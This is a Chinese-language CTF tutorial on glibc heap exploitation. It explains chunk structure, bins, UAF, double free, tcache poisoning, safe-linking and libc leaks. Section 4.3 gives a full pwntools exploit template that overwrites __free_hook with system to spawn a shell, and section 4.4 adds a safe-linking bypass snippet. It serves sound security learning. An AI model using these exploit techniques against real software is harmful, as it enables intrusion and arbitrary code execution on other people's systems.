# 堆溢出学习手册（入门到能独立解 tcache 题）

> 适用人群：已掌握栈溢出 / ret2libc，刚开始接触堆。
> 主线策略：**在 glibc 2.27 或 2.31 上，打通 tcache 一条线**，再横向扩展到 2.23 和 2.32+。

## 阅读顺序（重要：别从头往下硬读）

这份手册是按知识深度线性排的，但学习要分遍走。跳着读会卡死，按这个顺序：

**第一遍（现在就读，读完这些就够了）**
- `-1` 三个主角：glibc 是谁
- `0.0` 一行代码看堆：malloc/free 到底干了什么
- `0.1` 四个函数逐个拆开
- `0.2` 三个结构（仓库类比）
- `0.3` 对齐怎么算

**第二遍（建立内存地图）**
- 第 1 节 chunk 结构 · 第 2 节 bins 全景 · 第 3 节 漏洞原语

**第三遍（动手打主线）**
- 第 4 节 tcache poisoning · 第 5 节 泄露 · 第 6 节 写到哪里

**随时翻（工具与排错）**
- 第 7 节 pwndbg 命令 · 第 8 节 报错对照表 · 第 9 节 练习顺序 · 第 10 节 解题骨架

> 凡是看到写着「先跳过」「后面第 X 节会讲」的段落，**直接跳过，不要试图当场弄懂**。
> 那些是提前埋的伏笔，读到对应章节自然就通了。

---

## -1. 三个主角：你的程序、glibc、堆

> 如果「glibc」「chunk」「bin」这些词让你发懵，从这里开始读。

### glibc 是什么

**C 语言本身很小**，只有语法和几十个关键字。`printf`、`malloc`、`free`、`strcpy`
这些天天用的函数**不是 C 语言自带的**，是别人写好打包给你的东西，叫「库」。

在 Linux 上，这份库最主要的一份叫 **glibc**（GNU C Library），
磁盘上就是一个文件，通常是 `/lib/x86_64-linux-gnu/libc.so.6`（几 MB，可以自己 `ls -l` 看）。
你的程序运行时，操作系统把这个文件也加载进内存；之后每次调 `malloc`，
实际是跳进 glibc 的代码里去执行。

**关键认知**：堆的全部规则——chunk 长什么样、free 之后挂到哪、tcache 有几条链——
**全是 glibc 里的一段普通 C 代码**（源码文件叫 `malloc.c`）。
不是硬件特性，不是操作系统特性，就是某个程序员写的逻辑。
所以我们学堆，本质是「读懂别人写的一段 C 程序，找它的逻辑漏洞」。

### 三者的关系

```
你的程序（题目给的二进制）
   │  菜单：1.add  2.edit  3.delete  4.show
   │  漏洞就藏在这几个函数里
   ↓  调用 malloc / free / printf
glibc（libc.so.6，运行时被加载进内存）
   │  里面有 malloc/free/printf/puts/system ……
   │  堆的管理逻辑都写在这里
   ↓  切分 / 回收 / 记账
堆（一块普通内存，里面是一块块 chunk）
```

所以：**堆漏洞 = 骗 glibc 的堆管理代码干错事**。写代码的是 glibc 不是你，你只是利用规则。

### 为什么攻击者死盯着 glibc

因为 `libc.so.6` 里不只有 `malloc/free`，**还有 `system`、`execve` 这些能开 shell 的函数**。
攻击的终点永远是执行 `system("/bin/sh")`，而它就躺在 glibc 里。
所以几乎每道题第一步都是想办法知道「glibc 被搬到内存的哪个位置了」：

1. 堆里残留数据里捡到一个地址（指向 glibc 内部，比如记账本 main_arena）
2. 减掉固定偏移 → 算出 glibc 的起始位置（**libc 基址**）
3. 基址 + 固定偏移 → 定位到 `system`，把某个要执行的函数指针改成它 → shell

> 比喻：glibc 是被搬进内存的一本工具书，找到书放在哪，就能翻到任何一页（包括 system 那页）。

### 菜单四件套（题目程序的功能，不是 glibc 的）

堆题几乎都是一个菜单程序，IDA 打开看到的四个选项：

| 选项 | 常见名字 | 干什么 | 看题时要检查什么 |
| --- | --- | --- | --- |
| 申请 | `add` / `create` / `malloc` | 让你定一个大小，malloc 一块 | 大小有没有上限 |
| 改内容 | `edit` / `fill` / `update` | 往某块里写数据 | **长度是不是你自己定的**（能超长写 = 堆溢出） |
| 释放 | `delete` / `free` / `remove` | free 掉某块 | **有没有把指针变量置 NULL**（没置 = UAF） |
| 打印 | `show` / `dump` / `print` | 把某块内容打印出来 | **能不能打印已 free 的块**（能 = 可泄露） |

**`show` 和 `edit` 都是题目程序自己写的函数，跟 glibc 没关系。**

---

## 0. 先修内功（30 分钟）

### 0.0 先看这个：一行代码里，堆到底发生了什么

> 如果 0.1 的表格让你发懵，先读这一节，读完再回头看表。

**第一件事：chunk 是「带包装盒的内存」。**

`malloc` 从来不会只给你 n 字节。它实际切出来的块叫 **chunk**，永远比你请求的大，
开头多 16 字节归 glibc 记账用（「包装盒」）：

```
chunk ──▶ +0x00  prev_size   ┐
          +0x08  size        ┘ 这 16 字节是包装盒，glibc 管，你平时碰不到
  p ─────▶ +0x10  你的数据 ……
```

- `p`（malloc 的返回值，手册里叫 `mem`）**不是**那块内存的开头，是跳过包装盒之后的位置
- `free(p)` 内部操作的是包装盒的地址（`p - 0x10`），不是 p 本身
- 申请 0x18 → chunk 实际 0x20；你能写 24 字节，因为下一块的 `prev_size` 那 8 字节也借给你
  （为什么能借？见下面这段）

**为什么下一块的 `prev_size` 能被借走（堆里最反直觉的一处）**

`prev_size` 这个字段是给**后一块**用的：它记着「我这一块有多大」，
这样后一块哪天被 free、需要往前合并时，才知道前一块在哪、多大。

于是有个推论：**如果前一块正在使用，后一块就永远不需要「往前找到它」**
（人家还在用，合并不了），那么后一块的 `prev_size` 就是一块彻底没人用的空地。
glibc 觉得浪费，就把它划给前一块当数据用——这就是「借用」。

| 状态 | 下一块的 `prev_size` | 前一块能用的空间 |
| --- | --- | --- |
| 前一块**在用** | 闲置 → **借给前一块** | 用户区 16 + 借来 8 = **24 字节** |
| 前一块**被 free** | 收回，写入「前一块是 0x20」 | 前一块反正空了，不在乎 |

> 类比：两个相邻储物柜中间的位置是「左边柜子多大」的标签。
> 左边装着东西时，这标签毫无意义（反正不能打通）；
> 左边空了要合并时，标签必须写清楚——但那时左边本来也空了，不在乎少这 8 字节。

所以可用空间公式是 **`可用 = chunksize - 8`**，只减去 `size` 那 8 字节：
自己头部的 `prev_size` 是给后一块用的，不算自己的开销。
`malloc(0x18)` → chunk 0x20 → `0x20 - 8 = 0x18`，你能写 24 字节。

**第二件事：free 不是「还内存」，是「记账 + 改包装」。**

`free(p)` 之后发生了什么（就这四条）：

1. 操作系统**没有**收回这些字节，它们还在你进程手里
2. glibc 只是把这块 chunk 记到某个「空闲清单」（bin）里，
   具体动作 = 把**用户区的开头 16 字节**（也就是从 `p` 指向的位置开始）
   改写成链表指针：`+0x10` 写 `fd`/`next`，`+0x18` 写 `bk` 或 `key`
3. 其余数据**原封不动**留着
4. **你的变量 p 完全没变**——p 是你程序栈上的变量，glibc 既不知道也不管它，不会替你置 NULL

> **易错点（非常重要）**：free 改的是**用户区**的开头 16 字节，**不是 chunk 头**那 16 字节。
> `prev_size`(+0x00) 和 `size`(+0x08) 属于 chunk 头，free 之后基本不动；
> 真正被改写的 `+0x10` / `+0x18` 是**原来存你数据的地方**，而 `p` 正好指向 `+0x10`。
> 所以「UAF 写入的前 8 字节盖在 fd 上」不是巧合，就是同一个地址。
>
> | 偏移 | 属于谁 | free 之后 |
> | --- | --- | --- |
> | `+0x00` prev_size | chunk 头 | 不动 |
> | `+0x08` size | chunk 头 | 不动（标志位除外） |
> | `+0x10` ← p | 用户区开头 | **改写成 fd / next** |
> | `+0x18` | 用户区 | **改写成 bk 或 key**（看 bin 类型） |
> | `+0x20` 往后 | 用户区 | 原样留着，不清零 |
>
> 各 bin 用到几个字段：tcache 用 `+0x10`(next) + `+0x18`(key)；
> fastbin 只用 `+0x10`(fd)；unsorted / small / large 用 `+0x10`(fd) + `+0x18`(bk)。

于是漏洞就出在 3 和 4。下面两行拆开逐词讲（词表见 -1 节的菜单四件套）：

**「free 之后还能 show → 打印开头 8 字节 → 得到一个地址」**

- **show**：题目程序菜单里的「打印」选项，能把某块堆内存的内容打到屏幕上
- **「旧数据还在」**：free 只改**用户区的开头 16 字节**（`+0x10`/`+0x18`），chunk 头和更后面的字节一个都不碰
- **「8 个字节正好是地址」——注意不是碰巧，是 glibc 自己刚写进去的**：
  free 时 glibc 必须记录「这块空了」，记录的方式就是在这块的开头 8 字节写一个地址。
  所以你打印它，开头 8 字节**必然**是个地址，百分百，不是运气。
  而 64 位机器上一个地址正好 8 字节长。

**那这个地址是谁的地址？是 `fd`，而且写的是「别人的地址」，不是自己这块的地址。**

- 这 8 字节就是 `fd`（tcache 里叫 `next`），本质是一张**贴在门口的便签**，
  上面写着"下一个空块在哪"。便签贴在 302 门口，写的却是 305 号。
- 自己的地址**不用记**：glibc 手里有链表头（存在 `main_arena`），
  顺着 fd 一路走就能摸到每一块，不需要每块自报家门（像寻宝：起点已知，每张纸条只写下一站）。

举例，`free(a); free(b)` 之后 tcache 链是 `B → A → NULL`：

| 谁的 fd | 里面写的值 | 含义 |
| --- | --- | --- |
| B 的 fd | **A 的位置** | 下一个空块是 A |
| A 的 fd | NULL | 后面没块了 |

> **例外**：double free 时链表变成 `A → A`，A 的 fd 等于 A 自己。
> 那是漏洞造成的异常状态，不是正常行为（2.29+ 还会专门检测它）。
- **泄露地址**：让程序把它 show 出来，你就白捡了一个真实地址

**那个地址指向哪里，取决于这块进了哪个 bin**（这决定了你能算出什么）：

| 这块进了哪个 bin | 开头 8 字节写的是 | 泄露出来能算什么 |
| --- | --- | --- |
| tcache | 堆里下一个空闲块的地址 | 堆地址 |
| fastbin | 堆里下一个空闲块的地址 | 堆地址 |
| **unsorted bin** | **glibc 内部记账本 main_arena 的地址** | **glibc 基址 ← 我们要的** |

> **⚠ 先跳过**：下面这一段属于第 2 节（bins）和第 5 节（泄露）的内容，
> 现在读不懂是正常的，**直接跳过，读到那两节再回来看**。这里先给五个词的一句话印象：
>
> - **tcache**：glibc 的"快取回收站"，小空块优先放这，每种尺寸最多放 7 个
> - **unsorted bin**：另一类回收站，太大或 tcache 放不下的块进这里
> - **top chunk**：堆末尾还没切出去的空地（见 0.2）
> - **合并**：两块相邻的空块会拼成一块大的；跟 top 相邻就直接被 top 吞掉
> - **垫块**：在目标块后面再申请一块，目的就是隔开 top，防止被吞
>
> 有了这五个词，等读到第 2 节时下面这段就自然通了：
>
> 为什么要「申请一个 >0x410 的大块再 free」：让它绕过 tcache 直接进 unsorted bin，
> glibc 写进去的地址才指向 glibc 自己，我们才算得出 libc 基址。
> 也解释了为什么要垫一块：紧贴 top 会被合并掉，压根不进 unsorted bin，
> glibc 也就不会写那个地址。

连起来：**free 之后 glibc 在开头 8 字节写了个地址 → 你让程序 show 那块内存 →
屏幕上刷出这串字节 → 你按小端序拼回一个数字 → 得到一个真实地址 → 拿去算 libc 基址。**

> 补充：字节是"倒着"存的（x86 小端序，低位在前），pwntools 的 `u64()` 会自动倒回来。

**「p 还能用 → free 之后还能 edit，写进去的前 8 字节正好落在 fd 上 → 改链表 = tcache poisoning」**

- **edit**：题目程序菜单里的「改内容」选项
- **fd**：free 之后，glibc 在这块内存的**开头 8 个字节**写的一个值，意思是「下一个空闲块在哪」，
  这个 8 字节的槽位叫 `fd`（forward，向前指针）
- **前 8 字节正好落在 fd 上**：edit 从内存开头开始写，而开头 8 字节正是 glibc 刚放 fd 的位置 →
  等于把 glibc 的账本涂改了
- **改链表**：把 fd 改成你想要的任何地址，glibc 下次分配就信了「下一个空块在那」，
  于是把那块地也分给你 → 任意地址写
- **tcache poisoning**：这个招数的英文名字，**就是「改 fd」这件事的学名**，没有第二层意思

注意一个反直觉的点：**空块的「链表节点」就存在空块自己身体里**。堆不像栈有单独的
链表结构，glibc 复用了用户数据区来串空闲块。

**第三件事：0.2 那三个结构，用仓库类比。**

| 术语 | 类比 | 一句话 |
| --- | --- | --- |
| 堆内存本身 | 仓库的地皮 | 程序启动后由 `brk` 向内核批发一大块，不是每次 malloc 都找内核 |
| `top chunk` | 还没划出去的空地 | 所有 bin 都给不出块时，从这切新的；永远在堆最末端 |
| `main_arena` | 管理员的台账本 | 记着所有空闲清单（bin）的表头；**它在 libc 里、不在堆里**，所以泄露它 = 泄露 libc 基址 |

### 0.1 四个函数，逐个拆开

#### 先对齐术语：用户区 = 数据区 = mem

这几个词在 glibc 源码、教程、writeup 里混着用，**指的全是同一个东西**，看到别当成不同概念：

| 叫法 | 哪来的 | 指向哪里 |
| --- | --- | --- |
| `mem` | glibc 源码变量名 | malloc 的返回值，`chunk + 0x10` |
| 用户区 / user data | glibc 注释 | mem 开始、你能读写的区域 |
| 数据区 | 中文资料习惯说法 | 和用户区完全同义 |
| `chunk` | glibc 源码 | `mem - 0x10`，带 16 字节头的整块 |

所以「返回用户区指针 mem」这句话翻译成人话就是：
**「返回的地址指向你能写数据的那片区域（而不是指向 glibc 的记账头）」**。

#### 四个函数的参数都代表什么

C 库命名很省：`p` = pointer（指针），`n` = number（数量/字节数），`s` = size（单个大小）。

| 函数 | 原型 | 参数含义 |
| --- | --- | --- |
| `malloc` | `void *malloc(size_t n)` | `n` = 想要多少**字节** |
| `free` | `void free(void *p)` | `p` = 之前 malloc 返回给你的那个指针 |
| `calloc` | `void *calloc(size_t n, size_t s)` | `n` = 元素**个数**，`s` = 每个元素**多少字节**；总大小 = `n × s` |
| `realloc` | `void *realloc(void *p, size_t n)` | `p` = 旧指针（当初 malloc 给你的），`n` = 想要的**新大小** |

> `realloc` 的读法：「我手上有一块内存（地址在 `p`），现在想让它变成 `n` 字节，你看着办。」

#### malloc(n) —— 「给我 n 字节」

原型 `void *malloc(size_t n)`，内部按顺序做四件事：

1. 把 n 换算成实际 chunk 大小：`size = (n + 8 + 15) & ~15`，最小 0x20
2. 按顺序找空闲 chunk：tcache → fastbin → small bin → unsorted → large → 切 top
3. 找到后把它从空闲链表里摘下来
4. **返回 `chunk + 0x10`** —— 跳过包装盒，直接指向能写数据的地方

```c
char *p = malloc(0x18);
// p     = 0x5555…92a0   ← 返回值，你拿到的（mem / 用户区 / 数据区）
// chunk = 0x5555…9290   ← 包装盒地址 = p - 0x10，glibc 自己用
// p[0..23] 都归你写：请求的 0x18 + 借下一块 prev_size 的 8 字节
```

两个关键性质：

- **不清零**：拿到的可能是刚 free 掉的旧块，旧数据原样还在 → 堆题的泄露全靠这个
- 失败返回 NULL；`n` 特别大（超过 mmap 阈值，默认 128KB）时改走 mmap，行为不一样

#### free(p) —— 「这块我不用了」

原型 `void free(void *p)`，**参数就是 malloc 返回的那个 p**（mem），不是 chunk 开头。
glibc 内部第一步先 `chunk = p - 0x10` 找回包装盒，读出 size，再决定挂到哪个 bin。

按顺序做四件事：

1. 一串合法性检查（对齐、size 合理、下一块 size 合理……）——不过关直接 abort，
   第 8 节那些报错信息全部来自这一步
2. 把**用户区的开头 16 字节**改写成链表指针（tcache 写 `next` + `key`）——注意不是 chunk 头，见 0.0 的易错点
3. 把它挂进对应 bin 的链表头——「记账」
4. 返回。**内存没还给系统、数据没清零、你程序里的变量 p 原样没动**

第 3、4 条里藏着两个漏洞原语：

- 数据没清零 → free 之后还能 show → 读出残留指针 → **泄露**
- p 没被置 NULL → free 之后还能 edit → 写的前 8 字节正好落在 next 上 → **UAF / tcache poisoning**

#### calloc(n, s) —— 「给我 n×s 字节，要全新的」

- 分配逻辑和 malloc 一样，区别是：**拿到旧块时先 memset 清零**（从 top 新切的本来就是零）
- 堆题坑：你 free 之后布置的假数据（伪造的 fd、假 size）会被它抹掉。
  看题第一件事：确认 add 函数用的是 malloc 还是 calloc，路线完全不同

#### realloc(p, n) —— 「之前那块不合适了」

- `p == NULL` → 等价 `malloc(n)`
- `n == 0` → 等价 `free(p)`，返回 NULL
- 其他情况：原块后面正好有空地就**原地扩**；否则 malloc 新块 + 拷贝旧数据 + free 旧块（**搬家**）
- 堆题坑：常被当成「malloc + free」组合技用；原地扩时返回值 == p，搬家时旧块会被 free 掉

### 0.2 三个结构（仓库类比）

把堆想象成一个仓库：

**堆内存本身 = 地皮。** 程序启动时，`brk` 这个系统调用向内核**一次性批发**一大块。
之后 malloc/free 都只在这块地里倒腾，不会再打扰内核（所以叫"小分配走 brk"）。

**top chunk = 还没划出去的空地。** 仓库刚开门时，整个堆就是一整块 top chunk。
每次 malloc 优先从回收站（bin）拿旧块；回收站没有，才从 top 上**切一块新的**。
所以 top 永远在堆的最末端，越用越小。

**main_arena = 管理员的台账本。** 所有「空闲清单」（bin）的表头都记在这本账上。
关键在于：**它是 libc 里的全局变量（.data 段），不在堆里**。
这决定了堆题最重要的一个技巧——只要任何地方泄露出一个指向 main_arena 的指针
（比如 unsorted bin 里空闲块的 fd），就能反推出 libc 整体被加载到了哪，
也就是「泄露 libc 基址」。堆题 90% 的 leak 最终都汇到这一句。

补充：`mmap` 是另一条路——单次请求超过阈值（默认 128KB）时不走仓库，
直接向内核单独批一块地，这种块 size 带 M 位，free 时直接还内核（munmap）。

### 0.3 对齐

- 64 位下 chunk 大小 **16 字节对齐**，地址 **16 字节对齐**。
- 请求大小 `n` → 实际 chunk `size = (n + 8 + 15) & ~15`，最小 0x20。

---

## 1. chunk 结构（最重要，手画一遍）

```c
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* 8B，前一块空闲时才有意义 */
  INTERNAL_SIZE_T      mchunk_size;       /* 8B，含低 3 位标志 */
  struct malloc_chunk* fd;                /* 仅空闲时有效 */
  struct malloc_chunk* bk;                /* 仅空闲时有效 */
  struct malloc_chunk* fd_nextsize;       /* 仅 large bin */
  struct malloc_chunk* bk_nextsize;       /* 仅 large bin */
};
```

### 1.1 已分配 chunk（64 位）

```
chunk ──▶ +0x00  prev_size       ← 前一块空闲时才有意义；否则被前一块借用
          +0x08  size  | N M P   ← 真实大小 = size & ~0x7
mem ─────▶ +0x10  user data ...
          +0x18  ...（可一直写到下一块的 prev_size 位置）
```

### 1.2 空闲 chunk

```
chunk ──▶ +0x00  prev_size
          +0x08  size
          +0x10  fd      ← 注意：这就是 mem 的开头！
          +0x18  bk
          +0x20  fd_nextsize   （仅 large bin）
          +0x28  bk_nextsize   （仅 large bin）
```

> **核心洞察**：`fd` 就长在 `mem` 的开头。所以「free 之后还能写」== 「能改 fd」。
> 这是 tcache poisoning 成立的全部前提。

### 1.3 指针换算（背下来）

```
mem    = chunk + 0x10
chunk  = mem   - 0x10
next   = chunk + (size & ~0x7)
prev   = chunk - prev_size
chunksize = size & ~0x7
```

### 1.4 size 低 3 位

| 位 | 宏 | 含义 |
| --- | --- | --- |
| bit0 | `PREV_INUSE` (P) | 前一块**正在使用**。为 0 时 `prev_size` 有效，free 时会向后合并 |
| bit1 | `IS_MMAPPED` (M) | 由 `mmap` 分配 |
| bit2 | `NON_MAIN_ARENA` (N) | 属于非主 arena（多线程） |

### 1.5 最小 chunk 与"借用"机制（算偏移的坑）

- 最小 chunk = **0x20**（因为 `fd`/`bk` 要占 16 字节用户区）。
- `malloc(0)` → chunk 0x20，但**用户可用 24 字节**（0x18），
  因为下一块的 `prev_size` 那 8 字节被借给用户数据了。
- 判断可用空间：已分配块 = `chunksize - 8`。

**借用为什么成立（详细版，0.0 也有简述）**

`prev_size` 记的是「前一块有多大」，用途只有一个：**后一块 free 时，靠它往前合并**。

1. 前一块**在用** → 后一块永远不需要往前合并 → 后一块的 `prev_size` 闲置
   → glibc 把它借给前一块当数据 → 前一块可用空间 +8 字节
2. 前一块**被 free** → 后一块的 `prev_size` 被收回，写入前一块的大小（如 0x20），
   同时后一块 `size` 的 P 位清零（表示"前一块空了"）
   → 前一块反正空了，用户区要让给 fd/bk，不亏

> 省这 8 字节是有意义的：小块分配极其频繁，每次浪费 8 字节累积起来很贵。

**算偏移时最容易踩的坑**：已分配块的可用空间是 `chunksize - 8` 而不是 `- 16`，
因为自己头部的 `prev_size` 是给后一块用的，不算自己的开销。

---

## 2. bins 全景

| bin | 结构 | 范围 | 顺序 | 特点 |
| --- | --- | --- | --- | --- |
| **tcache** | 64 条单向链表，每线程一份 | 0x20 – 0x410，每链 ≤ 7 | LIFO | `next` 指向 `mem`；取出几乎不检查 |
| **fastbin** | 10 条单向链表 | 0x20 – 0x80 | LIFO | `fd` 指向 chunk 头；不合并，P 位保持 1 |
| **unsorted bin** | 1 条双向环形链表 | 除 fastbin 外所有 | FIFO | `fd/bk` 指向 `main_arena`，**泄露 libc 的关键** |
| **small bin** | 62 条双向环形链表 | < 0x400 | FIFO | 由 unsorted 归位而来 |
| **large bin** | 63 条双向链表 | ≥ 0x400 | best fit | 带 `fd_nextsize`/`bk_nextsize` |

### 2.1 free 之后的去向（按源码顺序）

1. `size` 在 0x20–0x410 **且** 该 tcache 链 `counts < 7` → **进 tcache**，直接返回（不合并）
2. 否则 `size` 在 0x20–0x80 → **进 fastbin**（不清 P 位、不合并）
3. 否则 → 与前后空闲块**合并**
4. 合并后与 top 相邻 → **并入 top**（这个块"消失"了）
5. 否则 → 挂进 **unsorted bin**

> **头号陷阱**：想靠 unsorted bin 泄露 libc，必须先申请一个**垫块**把它和 top 隔开，
> 否则直接被 top 吞掉，`fd/bk` 里啥也没有。

### 2.2 malloc 的查找顺序

```
tcache（精确 size）
  → fastbin（精确 size）
    → small bin（精确 size）
      → 遍历 unsorted bin（同时把里面的块归位到 small/large）
        → large bin（best fit）
          → 切 top chunk
            → 扩展堆（brk）
              → mmap
```

### 2.3 tcache 的"装填"机制（重要）

当某条 tcache 链**满了 7 个**，之后 free 的同 size chunk 会走正常路径进 fastbin / unsorted bin。
下次 malloc 该 size 时，glibc 会把 fastbin 里剩下的 chunk **批量搬进 tcache**。
利用这点可以让同一个块同时出现在两个 bin 里（很多进阶题的构造手法）。

---

## 3. 漏洞原语（阶段 3）

| 原语 | 描述 | 典型利用 |
| --- | --- | --- |
| **UAF** | `free` 后指针没置 NULL，仍能读写 | **直接改 fd → tcache poisoning**。最干净 |
| **Double free** | 同一块 free 两次，链表成环 | 拿不到写权限时的替代方案（见 3.1） |
| **Heap overflow** | 写入长度超过申请大小 | 改下一块的 `size`（扩展重叠）或 `fd` |
| **Off-by-one** | 多写 1 字节 | 改下一块 `size` 的低字节 → chunk 扩展 → 重叠 |
| **Null byte overflow** | 溢出 `\x00` | 把 `size` 低字节清零 → 收缩 → 制造重叠块 |
| **未初始化使用** | `malloc` 后直接读 | 读出残留指针，泄露地址 |

### 3.1 double free 的版本差异（别记错）

- **glibc 2.26–2.28**：`tcache_entry` 没有 `key` 字段，**裸 double free 直接成功**，链表成 `A → A`。
- **glibc 2.29+**：加了 `key` 字段。`free` 时若 `e->key == tcache` 就遍历链表检查，
  找到自己就 `free(): double free detected in tcache 2`。绕过：
  1. 有 UAF/溢出时，把该块的 `key` 写成非 `tcache` 的值，再 free；
  2. 或者改链上某块的 `next`，让遍历提前断链、找不到它；
  3. **或者干脆不用 double free**，直接 UAF 改 `next`（最优解）。
- **`free(A); free(B); free(A)` 是 fastbin 的绕过手法**（fastbin 只检查链头是否等于自己），
  **不是** tcache 的。别混。

---

## 4. 主线：tcache poisoning（glibc 2.27 / 2.31）

### 4.1 五步流程

```
1. a = malloc(0x18); b = malloc(0x18)          # 同 size，chunk 都是 0x20
2. free(a); free(b)                            # tcache[0]: b → a → NULL
3. 改 b 的前 8 字节 = &target                   # UAF / 溢出
4. c = malloc(0x18)                            # c == b
5. d = malloc(0x18)                            # d == target，写什么都行
```

### 4.2 为什么它比 fastbin attack 简单

`tcache_get` 只做一件事：`if (!aligned_OK(e)) error`。
**不检查 size，不检查双向链表**。而 `_int_malloc` 的 fastbin 分支会校验
`chunksize(victim)` 必须属于该索引，否则 `malloc(): memory corruption (fast)`，
所以 fastbin attack 必须在目标附近先伪造一个合法的 size。

### 4.3 完整 exp 模板（2.27 / 2.31，UAF 版）

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

elf  = ELF('./pwn')
libc = ELF('./libc-2.27.so')
io   = process([elf.path], env={'LD_PRELOAD': libc.path})
# 远端：io = remote('host', port)

def add(size, data):   io.sendlineafter(b'> ', b'1'); io.sendlineafter(b'size', str(size)); io.sendafter(b'data', data)
def edit(idx, data):   io.sendlineafter(b'> ', b'2'); io.sendlineafter(b'idx', str(idx));  io.sendafter(b'data', data)
def free(idx):         io.sendlineafter(b'> ', b'3'); io.sendlineafter(b'idx', str(idx))
def show(idx):         io.sendlineafter(b'> ', b'4'); io.sendlineafter(b'idx', str(idx))

# ---------- 第一步：泄露 libc ----------
# 申请一块 > 0x410 的（不会进 tcache），下面垫一块，free 后进 unsorted bin
big = add(0x500, b'BIG')      # chunk 0x510
pad = add(0x20,  b'PAD')      # 防止 big 被 top 吞掉
free(big)
show(big)                     # 读出 fd，它指向 main_arena + 0x58
leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = leak - (libc.sym['main_arena'] + 0x58)   # 不要硬编码偏移
log.success('libc base: %#x' % libc.address)

# ---------- 第二步：tcache poisoning ----------
a = add(0x18, b'A')
b = add(0x18, b'B')
free(a)
free(b)                                    # tcache[0]: b -> a
edit(b, p64(libc.sym['__free_hook']))      # 改 b->next

c = add(0x18, b'/bin/sh\x00')              # 拿回 b
d = add(0x18, p64(libc.sym['system']))     # 拿到 __free_hook，写入 system

free(c)                                    # system("/bin/sh")
io.interactive()
```

### 4.4 safe-linking 版（glibc 2.32+）

```c
#define PROTECT_PTR(pos, ptr) (((size_t)(pos) >> 12) ^ (size_t)(ptr))
```

`next` 存的是 `((&e->next) >> 12) ^ real_ptr`，其中 `&e->next` 就是那个 chunk 的 `mem` 地址。

```python
# 必须先知道堆基址（或至少该 chunk 的地址）
chunk_mem = heap_base + known_offset
fake_next = (chunk_mem >> 12) ^ target
edit(b, p64(fake_next))
```

泄露堆基址的办法：让两个块通过 tcache 链起来，读出 `next`，
`heap_addr = stored_next << 12` 再结合已知偏移反推（因为高 52 位保留，低 12 位被异或）。

---

## 5. 泄露（阶段 5）：没有 leak 就没有攻击

### 5.1 泄露 libc

**方法 A：unsorted bin（最常用）**
```
申请 size > 0x410（2.23 上 > 0x80 即可）的块 + 下面垫一块
free(大块)  → 进 unsorted bin
show(大块)  → 读到 fd/bk，其值 = &main_arena.bins[0] - 0x10 = main_arena + 0x58
libc_base = leak - (libc.sym['main_arena'] + 0x58)
```

**方法 B：large bin 残留**、**方法 C：stdout 打表**（无 show 函数时）

### 5.2 泄露堆地址

- tcache / fastbin 链上的 `next` 是堆地址（2.32 前可直接读）
- large bin 的 `bk_nextsize`
- 2.32+ 必须泄露，否则无法构造 `PROTECT_PTR`

### 5.3 泄露栈地址

`libc.sym['environ']` 里存着栈上的 `envp` 指针。任意地址读打这里即可。

---

## 6. 写到哪里（阶段 6）

| 目标 | 版本 | 说明 |
| --- | --- | --- |
| `__free_hook` | < 2.34 | 改成 `system`，再 `free` 一块内容为 `/bin/sh` 的 chunk。**最简单** |
| `__malloc_hook` | < 2.34 | 改成 one_gadget 或 `realloc+n` 调栈。注意 malloc 时寄存器/栈条件 |
| **GOT 表** | 全版本（需 Partial RELRO） | 把 `free@got` / `puts@got` / `atoi@got` 改成 `system` 或 one_gadget |
| `_IO_2_1_stdout_` | 2.34+ 常用 | 改 flags + write_base 做任意读；改 vtable 做任意写 |
| exit 相关结构 | 2.34+ | `__exit_funcs` / `tls_dtor_list`（house of banana） |
| 栈上返回地址 | 任意 | 需先 leak 栈（`environ`），成本高，最后手段 |

> **2.34 之后不要浪费时间写 `__free_hook`**，变量还在但已不被调用。

---

## 7. pwndbg 调试速查

```
heap                      列出所有 chunk
bins                      显示所有 bin（含 tcache）
tcachebins / fastbins     只看某一类
vis_heap_chunks [addr]    图形化堆布局（最常用，配合 vis）
malloc_chunk <addr>       解析单个 chunk 结构
arena / arenas            查看 main_arena
top_chunk                 看 top
find_fake_fast <addr>     在附近找可伪造的 fastbin size
distance <a> <b>          算两地址差（算偏移神器）
try_free <addr>           模拟一次 free
heap_config               看当前 glibc 的堆参数（tcache 条数等）
```

**推荐的观察节奏**：每次 `add`/`free` 之后都按一次 `vis` 和 `bins`，
把「我这一步让内存变成什么样」和「屏幕上显示什么」对应起来，
比背一百遍理论都管用。

**下断点**：`b malloc`、`b free`、`b __libc_free`、或者直接在菜单函数上下。

---

## 8. 报错信息对照表（撞到就知道哪里错了）

| 报错 | 含义 | 常见原因 |
| --- | --- | --- |
| `malloc(): memory corruption (fast)` | fastbin 取出块的 size 不匹配 | fastbin attack 没伪造 size |
| `free(): double free detected in tcache 2` | 2.29+ tcache double free | 需要破坏 key 或断链 |
| `free(): invalid pointer` | 指针没对齐 / 不是 mem 开头 | 目标地址选错 |
| `free(): invalid size` | size 太小或未对齐 | 伪造的 size 不合法 |
| `corrupted size vs. prev_size` | 下一块 size 与 prev_size 不符 | 溢出破坏了元数据 |
| `corrupted double-linked list` | unlink 时 `P->fd->bk != P` | small/large bin 的 unlink 检查 |
| `malloc(): unaligned tcache chunk detected` | tcache 取出地址未 16 对齐 | 目标地址没对齐 |
| `malloc(): corrupted top size` | top chunk 的 size 被改坏 | house of force 改太大 |

---

## 9. 练习顺序

### 阶段一：建立手感（1–2 天）
1. 自己写个 30 行的 `malloc/free` 小程序，用 gdb 一步一步看 chunk 长什么样
2. 跑一遍 [how2heap](https://github.com/shellphish/how2heap) 的 `tcache_poisoning`，
   在 gdb 里跟着走完全程（**不要只看源码，一定要 gdb**）

### 阶段二：tcache 主线（1 周）
3. how2heap: `tcache_house_of_spirit`
4. BUUCTF：`npuctf_2020_easyheap`（2.27 tcache，标准 UAF + 任意地址写）
5. BUUCTF：`hitcon_2018_children_tcache`（2.27，tcache 经典）

### 阶段三：2.23 无 tcache 世界（1 周）
6. how2heap: `fastbin_dup` → `fastbin_dup_consolidate` → `unsafe_unlink`
7. BUUCTF：`babyheap_0ctf_2017`（2.23，堆溢出 + unsorted bin leak + fastbin attack 写 `__malloc_hook`）
8. BUUCTF：`[V&N2020 公开赛]simpleHeap`（2.23，off-by-one）

### 阶段四：绕过与扩展
9. how2heap: `house_of_force` → `house_of_spirit` → `unsorted_bin_attack`
10. 找一道 2.32+ 的题，练 safe-linking
11. 这时候再看 house of 系列：`einherjar` → `orange` → `apple` / `banana`

